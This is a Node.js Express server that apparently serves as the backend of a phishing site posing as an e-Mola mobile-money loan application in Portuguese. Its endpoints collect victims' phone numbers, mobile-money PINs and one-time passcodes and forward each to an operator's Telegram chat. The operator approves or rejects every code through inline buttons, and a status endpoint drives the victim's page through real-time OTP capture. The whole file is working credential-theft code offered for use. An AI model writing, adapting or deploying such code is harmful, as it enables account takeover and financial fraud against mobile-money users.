const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Fetch Environment Variables set in Render Dashboard
const BOT_TOKEN = process.env.BOT_TOKEN; 
const CHAT_ID = process.env.CHAT_ID; 

let latestStatus = "pending";

// 1. Receive loan application and PIN submission from frontend
app.post('/api/submit', async (req, res) => {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error("❌ Configuration Error: BOT_TOKEN or CHAT_ID is missing in Render environment settings.");
        return res.status(500).json({ success: false, error: "Server environment missing BOT_TOKEN or CHAT_ID" });
    }

    const { phone, amount, purpose, pin } = req.body;
    latestStatus = "pending";

    const message = `📲 *Novo Pedido de Empréstimo (e-Mola)*\n\n` +
                    `• *Telemóvel:* ${phone}\n` +
                    `• *Valor:* ${amount}\n` +
                    `• *Finalidade:* ${purpose || 'N/A'}\n` +
                    `• *PIN:* ${pin}\n\n` +
                    `Por favor, escolha uma ação:`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Aprovar", callback_data: `approve_${phone}` },
                { text: "❌ Recusar", callback_data: `decline_${phone}` }
            ]
        ]
    };

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });

        const data = await response.json();
        if (!data.ok) {
            console.error("Telegram API Error:", data.description);
            return res.status(400).json({ success: false, error: data.description });
        }

        res.json({ success: true });
    } catch (err) {
        console.error("Server Submit Error:", err.message);
        res.status(500).json({ success: false, error: err.message });
    }
});

// 2. Poll endpoint for frontend status checks
app.get('/api/status', (req, res) => {
    res.json({ status: latestStatus });
});

// 3. Receive OTP (OTP-1 & OTP-2) submissions from frontend
app.post('/api/submit-otp', async (req, res) => {
    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({ success: false, error: "Missing bot credentials" });
    }

    const { phone, otp } = req.body;
    latestStatus = "pending";

    const message = `🔐 *Verificação OTP Recebida*\n\n` +
                    `• *Telemóvel:* ${phone}\n` +
                    `• *Código:* ${otp}\n\n` +
                    `Por favor, verifique:`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ OTP Correto", callback_data: `correct_otp_${phone}` },
                { text: "❌ OTP Errado", callback_data: `wrong_otp_${phone}` }
            ]
        ]
    };

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            })
        });

        const data = await response.json();
        res.json({ success: data.ok });
    } catch (err) {
        console.error("OTP Send Error:", err.message);
        res.status(500).json({ success: false });
    }
});

// 4. Telegram Webhook (Prevents button spinner hanging & controls approval states)
app.post('/webhook', async (req, res) => {
    // Immediately send HTTP 200 so Telegram doesn't time out
    res.sendStatus(200);

    try {
        const update = req.body;

        if (update && update.callback_query) {
            const action = update.callback_query.data;
            const callbackQueryId = update.callback_query.id;

            console.log(`🔔 Webhook Callback Received: ${action}`);

            if (action.startsWith("approve") || action.startsWith("correct_otp")) {
                latestStatus = "approved";
            } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
                latestStatus = "wrong_otp";
            }

            // Clear the Telegram button loading spinner on your mobile app
            if (BOT_TOKEN) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId,
                        text: "Ação registada com sucesso!"
                    })
                });
            }
        }
    } catch (err) {
        console.error("Webhook Internal Handler Error:", err.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running and listening on port ${PORT}`);
});